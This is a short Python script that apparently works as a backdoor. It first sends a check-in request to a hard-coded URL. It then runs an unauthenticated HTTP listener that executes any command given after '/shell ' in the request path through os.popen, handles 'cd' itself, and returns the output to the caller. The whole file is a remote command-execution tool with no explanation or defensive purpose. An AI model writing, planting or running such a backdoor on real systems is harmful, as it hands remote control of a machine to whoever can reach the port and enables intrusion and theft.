
connect:str = "http://127.0.0.1:8888/?api_key"
http_port: int = 11451

import os
import socket
import requests
import urllib

def send_target():
    requests.get(connect)
    pass

def http_service():
    #print(" [INFO] START HTTP SEVICE ON PORT: "+str(port))
    http_socket = socket.socket()
    http_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    http_socket.bind(("127.0.0.1",http_port))
    http_socket.listen()
    while True:
        conn, addr = http_socket.accept()
        #print(conn.getsockname)

        client_message = conn.makefile().readline()
        
        try:
            requests_url: str = client_message[client_message.index(" ")+1:client_message.rfind("H")-1]
            requests_url: str = requests_url.strip()
            requests_url: str = urllib.parse.unquote(requests_url)

            print(requests_url)

            if requests_url.startswith("/shell "):
                shell: str = requests_url[requests_url.index("/shell ")+len("/shell ") : len(requests_url)]
                
                if shell.startswith("cd "):
                    cd_path = shell[3:len(shell)]
                    cd_path = cd_path.strip()
                    os.chdir(cd_path)

                run = os.popen(shell)
                conn.send(bytes(run.read().encode()))
                conn.close()
            
            else:
                conn.send(bytes("command error".encode()))
                conn.close()

        except:
            conn.send(bytes("error".encode()))
            conn.close()
            continue

if __name__ == '__main__':
    send_target()
    http_service()
    